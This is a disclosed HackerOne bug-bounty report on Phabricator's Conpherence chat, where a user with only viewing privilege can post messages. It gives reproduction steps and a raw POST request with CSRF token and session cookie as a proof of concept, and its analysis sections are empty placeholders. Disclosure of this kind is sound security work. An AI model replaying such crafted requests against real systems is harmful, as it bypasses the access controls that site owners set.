---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '202499'
original_report_id: '202499'
title: User with only Viewing Privilege can send message to Room
weakness: Privilege Escalation
team_handle: phabricator
created_at: '2017-02-01T00:53:23.818Z'
disclosed_at: '2017-02-01T03:41:01.357Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
tags:
- hackerone
- privilege-escalation
---

# User with only Viewing Privilege can send message to Room

## Metadata

- HackerOne Report ID: 202499
- Weakness: Privilege Escalation
- Program: phabricator
- Disclosed At: 2017-02-01T03:41:01.357Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey, mongoose

When the owner of a chat room gives any user Viewing Privilege, that user can then send messages to the room. As expected, there's no form to send messages when the user access the room since in theory it shouldn't be possible. However, messages via POST requests can still be sent and processed.

The Severity of this issue is marked as low, but it still can be a serious problem depending on the scenario.

Steps to reproduce
====================

1. Create a new room
2. Give **only** Viewing Privilege to a user or all users
3. Send the following POST as the user with Viewing Privilege only
4. Refresh browser and see the message sent

```
POST /conpherence/update/1/ HTTP/1.1
Host: 192.168.25.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Phabricator-Csrf: B@6uaixbh422c60ea95853fee4
X-Phabricator-Via: /
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Cookie: phsid=35yvcfc22xj27th6hwawazghx5cnritidfccxdhh; phusr=lucasveiga
Connection: close

__form__=1&action=message&text=TESTTEXT&latest_transaction_id=10&__wflow__=true&__ajax__=true&__metablock__=6
```

This isn't session related since logging in and out doesn't affect anything. Just replace "X-Phabricator-Csrf" and "phsid" with the new ones and the message still will be sent.

Let me know if you need further information.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
